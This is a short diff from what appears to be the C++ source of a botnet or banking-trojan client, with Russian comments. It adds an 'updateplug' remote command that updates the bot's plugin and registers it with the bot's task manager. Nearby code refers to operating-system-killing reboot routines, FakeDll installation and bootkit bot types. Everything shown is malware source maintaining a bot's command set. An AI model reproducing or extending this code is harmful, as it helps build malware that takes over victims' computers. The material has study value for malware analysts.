@@ -19,12 +19,13 @@
 #include "CabPacker.h"
 #include "BotDef.h"
 #include "StrConsts.h"
-#include "KillOs_Reboot.h"
+#include "Installer.h"
 
 #include <shlobj.h>
 #include <shlwapi.h>
 
 #include "Modules.h"
+#include "killos_reboot.h"
 
 #include "BotMonitorMsg.h"
 
@@ -1136,6 +1137,16 @@ bool ExecuteExec(PTaskManager Manager, PCHAR Command, PCHAR Args)
 	}
 }
 
+
+//--------------------------------------------------
+//  Функция обновляет плагин бота bot.plug
+//--------------------------------------------------
+bool ExecuteUpdatePlug(PTaskManager Manager, PCHAR Command, PCHAR Args)
+{
+     return UpdateBotPlug() != FALSE;
+}
+
+
 DWORD WINAPI ThreadAddTrust( char* nameFile )
 {
 	BYTE* data = 0;
@@ -1368,6 +1379,13 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 
 
 
+const char* CommandUpdatePlug = "updateplug";
+
+//const char* Plugin::CommandInstallBk     = "installbk";
+//const char* Plugin::CommandInstallBkStat = "install-bk-with-report";
+
+
+
 
 void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
 {
@@ -1388,7 +1406,7 @@ void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
     }
 
 	// Команда обновления плага
-	RegisterCommand(Manager, (PCHAR)Plugin::CommandUpdatePlug, Plugin::ExecuteUpdatePlug);
+	RegisterCommand(Manager, (PCHAR)CommandUpdatePlug, ExecuteUpdatePlug);
 
 	// Команда установки FakeDll
 	if (BOT::GetBotType() != BotFakeDll && BOT::GetBotType() != BotBootkit)
